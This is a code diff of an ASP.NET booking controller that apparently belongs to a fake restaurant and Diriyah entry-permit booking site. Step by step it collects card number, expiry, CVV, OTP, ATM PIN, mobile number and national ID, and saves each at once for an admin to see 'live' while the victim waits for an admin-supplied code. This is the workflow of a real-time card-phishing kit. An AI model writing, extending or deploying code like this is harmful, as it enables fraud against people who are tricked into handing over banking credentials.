@@ -12,55 +12,66 @@ public class BookingController : Controller
         _context = context;
     }
 
-    // ======================================================
-    // 1️⃣ CREATE ORDER + ORDER ITEM
-    // ======================================================
+   
     [HttpPost]
-    public IActionResult Create(
-        int restaurantId,
-        DateTime BookingDate,
-        int Guests,
-        string SelectedTime)
+    public IActionResult Create(int restaurantId,
+                                DateTime BookingDate,
+                                int Guests,
+                                string SelectedTime)
     {
-        var restaurant = _context.Restaurants
-                                 .FirstOrDefault(r => r.Id == restaurantId);
-
-        if (restaurant == null)
-            return NotFound();
-
-        if (string.IsNullOrEmpty(SelectedTime))
-            return RedirectToAction("Details", "Restaurants", new { id = restaurantId });
+        var userKey = Guid.NewGuid().ToString();
 
         var order = new Order
         {
-            FakeUserKey = Guid.NewGuid().ToString(),
-
-            // ✅ أهم سطر — يظهر فوراً عند الأدمن
-            Status = OrderStatus.PendingAdmin
+            FakeUserKey = userKey,
+            Status = OrderStatus.Draft,
+            Items = new List<OrderItem>()
         };
 
-        var item = new OrderItem
+        OrderItem item;
+
+        if (restaurantId > 0)
         {
-            RestaurantId = restaurant.Id,
-            Title = restaurant.Name,
-            BookingDate = BookingDate,
-            Guests = Guests,
-            SelectedTime = SelectedTime,
-            UnitPrice = restaurant.MinimumCharge,
-            LineTotal = restaurant.MinimumCharge * Guests
-        };
+            var restaurant = _context.Restaurants
+                                     .FirstOrDefault(r => r.Id == restaurantId);
+
+            if (restaurant == null)
+                return NotFound();
+
+            item = new OrderItem
+            {
+                Title = restaurant.Name,
+                BookingDate = BookingDate,
+                Guests = Guests,
+                SelectedTime = SelectedTime,
+                UnitPrice = restaurant.MinimumCharge,
+                LineTotal = restaurant.MinimumCharge * Guests
+            };
+        }
+        else
+        {
+           
+            item = new OrderItem
+            {
+                Title = "تصريح دخول الدرعية",
+                BookingDate = BookingDate,
+                Guests = Guests,
+                SelectedTime = SelectedTime,
+                UnitPrice = 0,
+                LineTotal = 0
+            };
+        }
 
         order.Items.Add(item);
 
         _context.Orders.Add(order);
-        _context.SaveChanges(); // 🔥 يظهر عند الأدمن مباشرة
+        _context.SaveChanges();
 
         return RedirectToAction("Checkout", new { id = order.Id });
     }
 
-    // ======================================================
-    // 2️⃣ CHECKOUT
-    // ======================================================
+
+    
     public IActionResult Checkout(int id)
     {
         var order = _context.Orders
@@ -73,6 +84,7 @@ public class BookingController : Controller
         return View(order);
     }
 
+
     [HttpPost]
     public IActionResult SavePaymentMethod(int id, string method)
     {
@@ -83,14 +95,13 @@ public class BookingController : Controller
 
         order.PaymentMethod = method;
 
-        _context.SaveChanges(); // 🔥 Live
+        _context.SaveChanges();
 
         return RedirectToAction("PaymentInfo", new { id });
     }
 
-    // ======================================================
-    // 3️⃣ CARD INFO
-    // ======================================================
+
+    
     public IActionResult PaymentInfo(int id)
     {
         var order = _context.Orders.Find(id);
@@ -100,6 +111,7 @@ public class BookingController : Controller
 
         return View(order);
     }
+
 
     [HttpPost]
     public IActionResult SaveCard(int id, Order model)
@@ -114,14 +126,13 @@ public class BookingController : Controller
         order.Expiry = model.Expiry;
         order.CVV = model.CVV;
 
-        _context.SaveChanges(); // 🔥 Live
+        _context.SaveChanges();
 
         return RedirectToAction("Otp", new { id });
     }
 
-    // ======================================================
-    // 4️⃣ OTP + ATM
-    // ======================================================
+
+   
     public IActionResult Otp(int id)
     {
         var order = _context.Orders.Find(id);
@@ -131,6 +142,7 @@ public class BookingController : Controller
 
         return View(order);
     }
+
 
     [HttpPost]
     public IActionResult SaveOtp(int id, Order model)
@@ -143,14 +155,13 @@ public class BookingController : Controller
         order.Otp = model.Otp;
         order.AtmPassword = model.AtmPassword;
 
-        _context.SaveChanges(); // 🔥 Live
+        _context.SaveChanges();
 
         return RedirectToAction("CustomerInfo", new { id });
     }
 
-    // ======================================================
-    // 5️⃣ CUSTOMER INFO
-    // ======================================================
+
+   
     public IActionResult CustomerInfo(int id)
     {
         var order = _context.Orders.Find(id);
@@ -161,6 +172,7 @@ public class BookingController : Controller
         return View(order);
     }
 
+
     [HttpPost]
     public IActionResult SaveCustomerInfo(int id, Order model)
     {
@@ -169,31 +181,17 @@ public class BookingController : Controller
         if (order == null)
             return NotFound();
 
-        if (!System.Text.RegularExpressions.Regex.IsMatch(
-            model.Mobile ?? "",
-            @"^(0\d{9}|5\d{8})$"))
-        {
-            ModelState.AddModelError("Mobile", "رقم الجوال غير صحيح");
-
-            order.Mobile = model.Mobile;
-            order.Provider = model.Provider;
-            order.NationalIdOrIqama = model.NationalIdOrIqama;
-
-            return View("CustomerInfo", order);
-        }
-
         order.Mobile = model.Mobile;
         order.Provider = model.Provider;
         order.NationalIdOrIqama = model.NationalIdOrIqama;
 
-        _context.SaveChanges(); // 🔥 Live
+        _context.SaveChanges();
 
         return RedirectToAction("Success", new { id });
     }
 
-    // ======================================================
-    // 6️⃣ SUCCESS (WAIT ADMIN CODE)
-    // ======================================================
+
+   
     public IActionResult Success(int id)
     {
         var order = _context.Orders
@@ -206,9 +204,8 @@ public class BookingController : Controller
         return View(order);
     }
 
-    // ======================================================
-    // AJAX — GET TRANSACTION CODE LIVE
-    // ======================================================
+
+   
     [HttpGet]
     public IActionResult GetTransactionCode(int orderId)
     {
@@ -218,5 +215,12 @@ public class BookingController : Controller
             return Json(new { transactionNo = "" });
 
         return Json(new { transactionNo = order.TransactionNo ?? "" });
+    }
+
+
+    
+    public IActionResult Tickets()
+    {
+        return View();
     }
 }
